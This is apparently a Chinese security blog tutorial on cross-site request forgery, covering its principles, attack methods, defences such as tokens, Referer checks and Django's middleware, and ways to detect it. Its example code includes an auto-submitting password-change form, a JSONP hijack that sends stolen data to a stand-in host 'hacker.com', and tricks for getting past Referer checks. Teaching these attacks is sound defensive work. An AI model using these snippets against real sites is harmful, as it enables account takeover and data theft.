<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="关于CSRF的那点事儿"><meta name="keywords" content="CSRF"><meta name="author" content="Yunen"><meta name="copyright" content="Yunen"><title>关于CSRF的那点事儿 | Yunen's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?33ecfad176b3600bd31dce47459394e6";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-CSRF简介"><span class="toc-number">1.</span> <span class="toc-text">0x01 CSRF简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CSRF原理"><span class="toc-number">2.</span> <span class="toc-text">0x02 CSRF原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CSRF能够造成的危害"><span class="toc-number">3.</span> <span class="toc-text">0x03 CSRF能够造成的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CSRF的利用方式"><span class="toc-number">4.</span> <span class="toc-text">0x04 CSRF的利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-HTML标签"><span class="toc-number">4.1.</span> <span class="toc-text">1) HTML标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Ajax"><span class="toc-number">4.2.</span> <span class="toc-text">2) Ajax</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-CSRF利用实例"><span class="toc-number">5.</span> <span class="toc-text">0x05 CSRF利用实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-常用利用方式"><span class="toc-number">5.1.</span> <span class="toc-text">1) 常用利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-结合XSS利用"><span class="toc-number">5.2.</span> <span class="toc-text">2) 结合XSS利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-jsonp"><span class="toc-number">5.3.</span> <span class="toc-text">3) jsonp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-更多例子"><span class="toc-number">5.4.</span> <span class="toc-text">4) 更多例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-防御CSRF攻击"><span class="toc-number">6.</span> <span class="toc-text">0x06 防御CSRF攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Token"><span class="toc-number">6.1.</span> <span class="toc-text">1) Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Referer"><span class="toc-number">6.2.</span> <span class="toc-text">2) Referer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-验证码"><span class="toc-number">6.3.</span> <span class="toc-text">3) 验证码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-关注点"><span class="toc-number">6.4.</span> <span class="toc-text">4) 关注点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-防御实例：Django的CSRF防御机制"><span class="toc-number">6.5.</span> <span class="toc-text">5) 防御实例：Django的CSRF防御机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-CSRF的常用检测方法"><span class="toc-number">7.</span> <span class="toc-text">0x07 CSRF的常用检测方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-黑盒"><span class="toc-number">7.1.</span> <span class="toc-text">1) 黑盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-白盒"><span class="toc-number">7.2.</span> <span class="toc-text">2) 白盒</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-补充说明"><span class="toc-number">8.</span> <span class="toc-text">0x08 补充说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-HttpOnly"><span class="toc-number">8.1.</span> <span class="toc-text">1) HttpOnly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XSS漏洞情况下的CSRF"><span class="toc-number">8.2.</span> <span class="toc-text">2) XSS漏洞情况下的CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-关于Flash的内容"><span class="toc-number">8.3.</span> <span class="toc-text">3) 关于Flash的内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-目前CSRF形势"><span class="toc-number">8.4.</span> <span class="toc-text">4) 目前CSRF形势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-结束语"><span class="toc-number">9.</span> <span class="toc-text">0x09 结束语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-参考"><span class="toc-number">10.</span> <span class="toc-text">0x0A 参考</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://q4.qlogo.cn/headimg_dl?dst_uin=2865859175&amp;spec=100"></div><div class="author-info__name text-center">Yunen</div><div class="author-info__description text-center">Just A Websafe Lover!</div><div class="follow-button"><a href="https://github.com/hackeryunen">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">17</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">22</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">4</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://www.cnblogs.com/yunen">Yunen's cnblog</a><a class="author-info-links__name text-center" href="http://www.safe6.cn/">Safe6's blog</a><a class="author-info-links__name text-center" href="http://www.lolpzili.com/">Lolpzili's blog</a><a class="author-info-links__name text-center" href="http://www.endereyewxy.com/">Endereye's blog</a><a class="author-info-links__name text-center" href="http://hackerdelort.com/">Delort's blog</a><a class="author-info-links__name text-center" href="https://www.aisnnu.com/">Aisnnu's blog</a><a class="author-info-links__name text-center" href="https://xhyeax.github.io/">Xhy's blog</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://0d077ef9e74d8.cdn.sohucs.com/rnCyUFE_jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Yunen's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/books">Books</a><a class="site-page" href="/about">About</a><a class="site-page" href="/project">Projects</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/atom.xml">RSS</a></span></div><div id="post-info"><div id="post-title">关于CSRF的那点事儿</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-24</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/原创栏目/">原创栏目</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="0x01-CSRF简介"><a href="#0x01-CSRF简介" class="headerlink" title="0x01 CSRF简介"></a>0x01 CSRF简介</h2><p>&#160;&#160;&#160;&#160;CSRF，也称XSRF，即跨站请求伪造攻击，与XSS相似，但与XSS相比更难防范，是一种广泛存在于网站中的安全漏洞，经常与XSS一起配合攻击。<br><a id="more"></a></p>
<h2 id="0x02-CSRF原理"><a href="#0x02-CSRF原理" class="headerlink" title="0x02 CSRF原理"></a>0x02 CSRF原理</h2><p>&#160;&#160;&#160;&#160;攻击者通过盗用用户身份悄悄发送一个请求，或执行某些恶意操作。<br>&#160;&#160;&#160;&#160;CSRF漏洞产生的主要原因：</p>
<ul>
<li>请求所有的参数均可确定</li>
<li>请求的审核不严格，如：只验证了Cookie</li>
</ul>
<p>关于CSRF的执行过程，这里引用自<strong>hyddd</strong>大佬画的图：<br><img src="https://i.loli.net/2019/03/24/5c97436f3c14c.jpg" alt><br>&#160;&#160;&#160;&#160;我们知道，当我们使用img等标签时，通过设置标签的src等属性引入外部资源，是可以被浏览器认为是合法的跨域请求，也就是说是可以带上Cookie访问的。<br>&#160;&#160;&#160;&#160;试想一下，如果我们在a.com上放置一个img标签<code>&lt;img src=//b.com/del?id=1&gt;</code>。当b.com的用户在cookie没过期的情况下访问a.com，此时浏览器会向b.com发送一个指向<code>http://b.com/del?id=1</code>的<code>GET</code>请求，并且这个请求是带上Cookie的，而b.com的服务器仅仅是通过cookie进行权限判断，那么服务器就会进行相应的操作，比如假设此处为删除某个文章，用户在不知情的情况下便已完成操作。</p>
<h2 id="0x03-CSRF能够造成的危害"><a href="#0x03-CSRF能够造成的危害" class="headerlink" title="0x03 CSRF能够造成的危害"></a>0x03 CSRF能够造成的危害</h2><ul>
<li>篡改目标网站上的用户数据； </li>
<li>盗取用户隐私数据； </li>
<li>作为其他攻击向量的辅助攻击手法； </li>
<li>传播CSRF蠕虫。</li>
</ul>
<h2 id="0x04-CSRF的利用方式"><a href="#0x04-CSRF的利用方式" class="headerlink" title="0x04 CSRF的利用方式"></a>0x04 CSRF的利用方式</h2><ul>
<li>通过HTML标签发送合法的跨域请求</li>
<li>通过Ajax发送请求（由于CORS机制的存在，一般不使用）</li>
</ul>
<p>这里涉及到同源策略，如果不是很清楚可以先去了解一下。</p>
<h3 id="1-HTML标签"><a href="#1-HTML标签" class="headerlink" title="1) HTML标签"></a>1) HTML标签</h3><p>&#160;&#160;&#160;&#160;我们知道，根据同源策略的规定，跨域请求是不允许带上Cookie等信息的，可是出于种种考虑最终没有进行完全禁止，即存在某些合法的跨域请求。<br>&#160;&#160;&#160;&#160;通常由HTML标签<code>src</code>、<code>lowsrc</code>等属性产生的跨域请求是被浏览器认为是合法的跨域请求，并且此时并不需要<strong>javascript</strong>的参与。<br><img src="https://i.loli.net/2019/03/25/5c98de42ab890.png" alt><br>&#160;&#160;&#160;&#160;由HTML标签发出的合法跨域请求与正常的用户点击发出的请求相比所不同的是：两者请求头中的<strong>Referer</strong>值不同。<br>&#160;&#160;&#160;&#160;不过值得说明的是IE浏览器在面对这种情况时会判断<strong>本地Cookie</strong>是否带上<strong>P3P</strong>属性，如果仅仅是内存Cookie则不受此影响。<br>&#160;&#160;&#160;&#160;CSRF不仅仅只能针对GET请求，也可以针对POST请求，不过只能使用from标签进行自动提交，注意此处需用到<strong>javascript</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://a.com/changepass&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;victim&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;hacker&quot;&gt;</span><br><span class="line">&lt;input id=&quot;sub&quot; type=&quot;submit&quot;&gt; //可用样式表将按钮隐藏</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;sub&quot;).click()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-Ajax"><a href="#2-Ajax" class="headerlink" title="2) Ajax"></a>2) Ajax</h3><p>&#160;&#160;&#160;&#160;除了通过HTML标签发送跨域请求外，还可以通过Ajax来发送跨域情况，不过Ajax是严格遵守CORS规则的。<br>&#160;&#160;&#160;&#160;关于CORS规则，不清楚的可以去看看<strong>evoA</strong>大佬的一篇文章<a href="https://xz.aliyun.com/t/4470#toc-11" target="_blank" rel="noopener">跨域方式及其产生的安全问题</a>。<br>&#160;&#160;&#160;&#160;简单来说就是需要构造的xhr的<code>withCredentials</code>属性也为<code>true</code>才能带上Cookie进行跨域请求，与IE兼容性不好，且构造难度较Html复杂，故通常情况下我们不使用Ajax来进行CSRF攻击。<br>&#160;&#160;&#160;&#160;通常使用Ajax来跨域进行CSRF攻击的漏洞一般都配合XSS漏洞，此时的Ajax与目标域相同，不受CORS的限制。  </p>
<h2 id="0x05-CSRF利用实例"><a href="#0x05-CSRF利用实例" class="headerlink" title="0x05 CSRF利用实例"></a>0x05 CSRF利用实例</h2><h3 id="1-常用利用方式"><a href="#1-常用利用方式" class="headerlink" title="1) 常用利用方式"></a>1) 常用利用方式</h3><p>&#160;&#160;&#160;&#160;攻击者构造恶意html，通过引诱用户/管理员访问，触发CSRF漏洞。<br><img src="https://i.loli.net/2019/03/25/5c98c737b44f7.png" alt></p>
<h3 id="2-结合XSS利用"><a href="#2-结合XSS利用" class="headerlink" title="2) 结合XSS利用"></a>2) 结合XSS利用</h3><p>&#160;&#160;&#160;&#160;CSRF+XSS结合，产生的危害已几何倍数剧增。如果CSRF和XSS两个漏洞是在同一个域下的话，那么此时的CSRF已经变成了OSRF了，即本站点请求伪造(出自黑客攻防技术宝典Web实战篇第二版p366)，此时已经变成XSS的请求伪造攻击，本文不在赘述。  </p>
<h3 id="3-jsonp"><a href="#3-jsonp" class="headerlink" title="3) jsonp"></a>3) jsonp</h3><p>&#160;&#160;&#160;&#160;我们知道网站api返回的数据类型一般为json型或Array型，这里我们仅讨论json型。<br>&#160;&#160;&#160;&#160;当我们需要调用远程api时json返回的数据一般如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user(&#123;&quot;name&quot;:&quot;Yunen&quot;,&quot;work&quot;:&quot;Student&quot;,&quot;xxxx&quot;:&quot;xxxxxxxxx&quot;,......&#125;)</span><br></pre></td></tr></table></figure></p>
<p>&#160;&#160;&#160;&#160;这是因为开发者如果需要调用远程服务器的api获取json数据，由于同源策略的限制，通过ajax获取就会显得比较麻烦，相比之下<code>&lt;script&gt;</code>标签的开放策略，无疑是最好的方法去弥补这一缺陷，使得json数据可以进行方便的跨域传输。此处的user为回调函数名，一般为某个请求参数值(比如：<strong>callback</strong>)，就上述例子说，只需要通过下面方法即可调用返回的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function user(data)&#123;</span><br><span class="line">        console.log(data);//此时的json数据已经存储进了data变量中    </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/03/25/5c98cf9a343b8.png" alt><br><img src="https://i.loli.net/2019/03/25/5c98d67b2238c.png" alt><br>&#160;&#160;&#160;&#160;这种远程api接口十分容易受到CSRF攻击，我们可以通过修改<strong>callback</strong>参数值并添加自定义函数，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function jsonphack(data)&#123;</span><br><span class="line">        new image().src=&quot;http://hacker.com/json.php?data=&quot;+escape(data);</span><br><span class="line">        //将json返回的数据发送到黑客服务器上</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://127.0.0.1/1.php?callback=jsonphack&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="4-更多例子"><a href="#4-更多例子" class="headerlink" title="4) 更多例子"></a>4) 更多例子</h3><p><a href="https://www.freebuf.com/articles/web/55965.html" target="_blank" rel="noopener">从零开始学CSRF</a><br><a href="https://xz.aliyun.com/t/1673" target="_blank" rel="noopener">Web安全系列 – Csrf漏洞</a><br><a href="https://xz.aliyun.com/t/2384" target="_blank" rel="noopener">phpMyAdmin 4.7.x CSRF 漏洞利用</a>  </p>
<h2 id="0x06-防御CSRF攻击"><a href="#0x06-防御CSRF攻击" class="headerlink" title="0x06 防御CSRF攻击"></a>0x06 防御CSRF攻击</h2><p>&#160;&#160;&#160;&#160;前边我们说到，产生CSRF的原因主要有两点，那么我们可以针对这两点进行相应的防御。</p>
<h3 id="1-Token"><a href="#1-Token" class="headerlink" title="1) Token"></a>1) Token</h3><p>&#160;&#160;&#160;&#160;我们知道CSRF攻击的请求除了Cookie以外，其他的内容必须提前确定好，那么如果我们在服务端要求提交的某一个参数中是随机的值呢？<br>&#160;&#160;&#160;&#160;这里我们称这个随机的、无法被预计的值叫做Token，一般是由服务端在接收到用户端请求后生成，返回给用户的Token通常放置在<strong>hidden</strong>表单或用户的<strong>Cookie</strong>里。<br>&#160;&#160;&#160;&#160;当用户打开正常的发送请求的页面时，服务器会生成一串随机的Token值给浏览器，在发送请求时带上此Token，服务端验证Token值，如果相匹配才执行相应的操作、<strong>销毁</strong>原Token以及生成并返回<strong>新</strong>的Token给用户，这样做不仅仅起到了<strong>防御CSRF</strong>的作用，还可以防止<strong>表单的重复提交</strong>。<br>&#160;&#160;&#160;&#160;由于HTML标签产生的合法跨域只能是单向请求，无法通过CSRF直接取返回的内容，所以我们无法使用CSRF先取Token值再构造请求，这使得Token可以起到防御CSRF的作用。<br>&#160;&#160;&#160;&#160;注意Token不应该放置在网页的<strong>Url</strong>中，如果放在Url中当浏览器自动访问外部资源，如img标签的src属性指向攻击者的服务器，Token会出现作为<strong>Referer</strong>发送给外部服务器，以下为相关实例：  </p>
<ul>
<li>WooYun-2015-136903</li>
</ul>
<h3 id="2-Referer"><a href="#2-Referer" class="headerlink" title="2) Referer"></a>2) Referer</h3><p>&#160;&#160;&#160;&#160;前边我们提到，CSRF伪造的请求与用户正常的请求相比最大的区别就是请求头中的<strong>Referer值</strong>不同，使用我们可以根据这点来防御CSRF。<br>&#160;&#160;&#160;&#160;在接收请求的服务端判断请求的Referer头是否为正常的发送请求的页面，如果不是，则进行拦截。<br>&#160;&#160;&#160;&#160;不过此方法有时也存在着一定的漏洞，比如可绕过等，所以最好还是使用Token。<br>&#160;&#160;&#160;&#160;判断Referer的一般方法就是利用正则进行判断，而判断Referer的正则一定要写全，不然就会如上所说，可绕过！曾经的Wooyun上就有许多CSRF的漏洞是由于Referer的正则不规范导致。<br>&#160;&#160;&#160;&#160;比如<code>^http\:\/\/a\.com</code>，只验证了是否Referer是否以<code>http://a.com</code>开头，可是没想到我们可以在自己的顶级域名添加一个子域名<code>http://a.com.hacker.com</code>；还有<code>http\:\/\/a\.com\/</code>，通过<code>http://hacker.com/?http://a.com/</code>绕过。以下相关例子均为Referer绕过：</p>
<ul>
<li>WooYun-2015-164067</li>
<li>WooYun-2015-165578</li>
<li>WooYun-2016-166608</li>
<li>WooYun-2016-167674</li>
</ul>
<p>&#160;&#160;&#160;&#160;有些网站由于历史原因会允许空Referer头，当https向http进行跳转时，使用Html标签(如img、iframe)进行CSRF攻击时，请求头是不会带上Referer的，可以达到空Referer的目的。<br><img src="https://i.loli.net/2019/03/26/5c9a1fd975b72.png" alt></p>
<h3 id="3-验证码"><a href="#3-验证码" class="headerlink" title="3) 验证码"></a>3) 验证码</h3><p>&#160;&#160;&#160;&#160;在发送请求前先需要输入基于服务端判断的验证码，机制与Token类似，防御CSRF效果非常好，不过此方法对用户的友好度很差。  </p>
<h3 id="4-关注点"><a href="#4-关注点" class="headerlink" title="4) 关注点"></a>4) 关注点</h3><p>&#160;&#160;&#160;&#160;关于CSRF的防护应首先关注高危操作的请求，比如:<strong>网上转账</strong>、<strong>修改密码</strong>等，其次应重点关注那些可以散播的，比如：<strong>分享链接</strong>、<strong>发送消息</strong>等，再者是能辅助散播的，如<strong>取用户好友信息</strong>等，因为前者加上后者制造出来的CSRF蠕虫虽不如XSS蠕虫威力大，可是也不可小觑。最后应关注那些高权限账户能够进行的<strong>特权操作</strong>，如：<strong>上传文件</strong>、<strong>添加管理员</strong>，在许多渗透测试中，便是起初利用这点一撸到底。</p>
<h3 id="5-防御实例：Django的CSRF防御机制"><a href="#5-防御实例：Django的CSRF防御机制" class="headerlink" title="5) 防御实例：Django的CSRF防御机制"></a>5) 防御实例：Django的CSRF防御机制</h3><p>&#160;&#160;&#160;&#160;新建个Django项目，打开项目下的<strong>settings.py</strong>文件，可以看到这么一行代码：<code>django.middleware.csrf.CsrfViewMiddleware</code><br><img src="https://i.loli.net/2019/03/26/5c99fa7461ff7.png" alt><br>这个就是Django的CSRF防御机制，当我们发送POST请求时Django会自动检测CSRF_Token值是否正确。我们把<code>Debug</code>打开，可以看到如果我们的POST请求无CSRF_Token这个值，服务端会返回403报错。<br><img src="https://i.loli.net/2019/03/26/5c99fb81dcc5c.png" alt><br>现在我们往表单上添加CSRF_Token的验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;/login/&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &#123;% raw %&#125;&#123;&#123;% endraw %&#125;% csrf_token %&#125; //添加Token</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;pwd&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;登陆&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>下图为生成的HTML，可以看到<code>{% csrf_token %}</code>这串代码被Django解析成了一个隐藏的<code>input</code>标签，其中的值为token值，当我们发送请求时必须带上这个值。<br><img src="https://i.loli.net/2019/03/26/5c99fdf9b1817.png" alt><br>只有这样Django才会接受POST请求来的数据，否则返回错误，并且原登陆页面的CSRF_Token重新生成，上一个进行销毁，很大程度上防御住了POST请求的CSRF。<br><img src="https://i.loli.net/2019/03/26/5c9a015bb3235.png" alt></p>
<p>补充一张暴漫系列图，引用自先知社区《聊聊CSRF漏洞攻防—-久等的暴漫》作者：<strong>farmsec</strong>：<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20171228123105-eb36ca20-eb87-1.png" alt></p>
<h2 id="0x07-CSRF的常用检测方法"><a href="#0x07-CSRF的常用检测方法" class="headerlink" title="0x07 CSRF的常用检测方法"></a>0x07 CSRF的常用检测方法</h2><h3 id="1-黑盒"><a href="#1-黑盒" class="headerlink" title="1) 黑盒"></a>1) 黑盒</h3><ul>
<li>首先肯定确定<strong>是否除Cookie外其他参数均可确定，即：无验证码，无Token等</strong>。</li>
<li>再者如果发现是<strong>Referer头判断</strong>的话，可以尝试是否可以绕过正则。</li>
<li>还有就是考虑能不能绕过Token，比如Url处的Token用加载攻击者服务器上的图片来获取。</li>
<li>最后可以考虑与XSS结合，如：攻击者使用iframe跨域，存在xss漏洞的网站插入的XSS执行代码为<code>eval(window.name)</code>，那么我们构造的iframe标签里可以添加个name属性与子页面进行通信，例子：wooyun-2015-089971。</li>
</ul>
<h3 id="2-白盒"><a href="#2-白盒" class="headerlink" title="2) 白盒"></a>2) 白盒</h3><ul>
<li>查看是否有Token，验证码，Referer等不确定参数判断。</li>
<li>判断Referer的正则是否安全。</li>
<li>判断Token返回的位置是否为安全位置。</li>
<li>判断生成的Token是否足够随机，毫无规律。</li>
</ul>
<p><em>从上到下挖掘难度依次递增</em></p>
<h2 id="0x08-补充说明"><a href="#0x08-补充说明" class="headerlink" title="0x08 补充说明"></a>0x08 补充说明</h2><h3 id="1-HttpOnly"><a href="#1-HttpOnly" class="headerlink" title="1) HttpOnly"></a>1) HttpOnly</h3><p>&#160;&#160;&#160;&#160;CSRF攻击不受Cookie的<strong>HttpOnly</strong>属性影响。<br><img src="https://i.loli.net/2019/03/26/5c9a0543ebef5.png" alt></p>
<h3 id="2-XSS漏洞情况下的CSRF"><a href="#2-XSS漏洞情况下的CSRF" class="headerlink" title="2) XSS漏洞情况下的CSRF"></a>2) XSS漏洞情况下的CSRF</h3><p>&#160;&#160;&#160;&#160;如果一个网站存在XSS漏洞，那么以上针对CSRF的防御几乎失去了作用。</p>
<h3 id="3-关于Flash的内容"><a href="#3-关于Flash的内容" class="headerlink" title="3) 关于Flash的内容"></a>3) 关于Flash的内容</h3><p>&#160;&#160;&#160;&#160;鉴于Flash的凉势，这里暂不做研究以节省时间。  </p>
<h3 id="4-目前CSRF形势"><a href="#4-目前CSRF形势" class="headerlink" title="4) 目前CSRF形势"></a>4) 目前CSRF形势</h3><p>&#160;&#160;&#160;&#160;就目前而言，CSRF这个沉睡的巨人颇有一番苏醒的意味，可导致的危害也正在逐步的为人们所知，但目前仍有许多开发人员还没有足够的安全意识，以为只要验证Cookie就能确定用户的真实意图了，这就导致了目前仍有大量潜在的CSRF漏洞的局面，CSRF是不可小觑的漏洞，希望大家看完这篇文章能对CSRF有个较为清晰的认识。</p>
<h2 id="0x09-结束语"><a href="#0x09-结束语" class="headerlink" title="0x09 结束语"></a>0x09 结束语</h2><p>&#160;&#160;&#160;&#160;这是我在信安之路投稿的第二篇文章，虽说内容较为基础，但也是我熟读几本相关书籍与相关文章、研究已知漏洞，所写出来的一篇半总结，半思考文章，也许里边会有些错误，麻烦各位表哥斧正，如果有想要与我交流相关内容的可以email我(asp-php#foxmail.com #换成@)。<br>&#160;&#160;&#160;&#160;最后欢迎大家多多投稿呀，真的能对自己的学习有很大帮助！</p>
<h2 id="0x0A-参考"><a href="#0x0A-参考" class="headerlink" title="0x0A 参考"></a>0x0A 参考</h2><p>书籍：<br><strong>《Web前端黑客技术揭秘》p83-p96<br>《XSS跨站脚本攻击剖析与防御》p182-p187<br>《黑客攻防技术宝典Web实战篇第二版》p368-p374</strong><br>文章:<br><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">CSRF漏洞挖掘</a><br><a href="https://blog.csdn.net/sum_rain/article/details/37085771" target="_blank" rel="noopener">WEB安全之Token浅谈</a><br><a href="https://xz.aliyun.com/t/4470" target="_blank" rel="noopener">跨域方式及其产生的安全问题</a><br><a href="https://blog.csdn.net/qq_41000891/article/details/82784489" target="_blank" rel="noopener">Django中CSRF原理及应用详解</a><br><a href="https://drops.secquan.org/papers/155" target="_blank" rel="noopener">CSRF简单介绍及利用方法 | WooYun知识库</a><br><a href="https://blog.csdn.net/liwb94/article/details/80221224" target="_blank" rel="noopener">原生JSONP实现_动态加载js（利用script标签）</a></p>
